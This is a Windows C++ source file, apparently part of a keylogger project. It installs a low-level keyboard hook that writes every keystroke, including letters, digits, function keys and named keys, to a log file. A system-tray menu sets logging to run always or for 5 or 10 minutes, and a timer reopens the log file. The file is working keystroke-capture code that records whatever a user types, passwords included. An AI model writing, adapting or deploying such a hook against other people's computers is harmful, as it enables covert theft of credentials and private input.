#include <windows.h>
#include<climits>
#include <fstream>
#include <commctrl.h>
#include "WinProcFun.hpp"
#include "resourse.hpp"

std::ofstream outfile;
time_t stop_time = LLONG_MAX;
HMENU popupMenu_handle;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  switch (uMsg)
  {
  case ID_CLICK:
    switch (lParam)
    {
    // case WM_LBUTTONDOWN:
    //   ShowWindow(hwnd,SW_NORMAL);
    //   break;
    case WM_RBUTTONDOWN:
      POINT pt;
      GetCursorPos(&pt);
      SetForegroundWindow((HWND)popupMenu_handle);
      switch (TrackPopupMenu(popupMenu_handle, TPM_RETURNCMD | TPM_BOTTOMALIGN | TPM_RETURNCMD, pt.x, pt.y, 0, hwnd, NULL))
      {
      case ID_ALLWAYS:
        stop_time = LLONG_MAX;
        break;
      case ID_5M:
        stop_time = time(NULL) + 300;
        break;
      case ID_10M:
        stop_time = time(NULL) + 600;
        break;
      // case ID_INPUT:
      //   int tmp;
      //   stop_time=time(NULL)+60*tmp;
      //   break;
      case ID_EXIT:
        PostQuitMessage(0);
        break;
      }
      break;
    }
    break;
  case WM_CLOSE:
    PostQuitMessage(0);
    break;
  case WM_DESTROY:
    PostQuitMessage(0);
    break;
  }
  return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
  time_t tmp = time(NULL);
  if (stop_time - tmp >= 0)
  {
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
      DWORD key = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;
      if (key >= 'A' && key <= 'Z' || key >= '0' && key <= '9')
        outfile << (char)key;
      else if (key >= 0x70 && key <= 0x87)
        outfile << "F" << (key - 0x69);
      else
        switch (key)
        {
        case 0x08:
          outfile << "Backspace";
          break;
        case 0x09:
          outfile << "Tab";
          break;
        case 0x10:
          outfile << "Shift";
          break;
        case 0x11:
          outfile << "Ctrl";
          break;
        case 0x0C:
          outfile << "Delete";
          break;
        case 0x0D:
          outfile << "Enter";
          break;
        case 0x14:
          outfile << "Caps lock Down";
          break;
        case 0x1B:
          outfile << "Esc";
          break;
        case 0x20:
          outfile << "Space";
          break;
        case 0x25:
          outfile << "向左";
          break;
        case 0x26:
          outfile << "向上";
          break;
        case 0x27:
          outfile << "向右";
          break;
        case 0x28:
          outfile << "向下";
          break;
        default:
          outfile << "Unknow:" << key;
          break;
        }
      outfile << " ";
    }
    if (nCode >= 0 && wParam == WM_KEYUP)
    {
      DWORD key = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;
      switch (key)
      {
      case 0x14:
        outfile << "Caps lock UP" << " ";
        break;
      }
    }
  }
  return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void CALLBACK TimerProc(HWND, UINT, UINT_PTR, DWORD)
{
  outfile.close();
  outfile.open(outfile_path, std::ios::out | std::ios::app);
  try
  {
    if (!outfile.is_open())
      throw "error:when open file";
  }
  catch (const char *msg)
  {
    MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
    PostQuitMessage(0);
  }
}
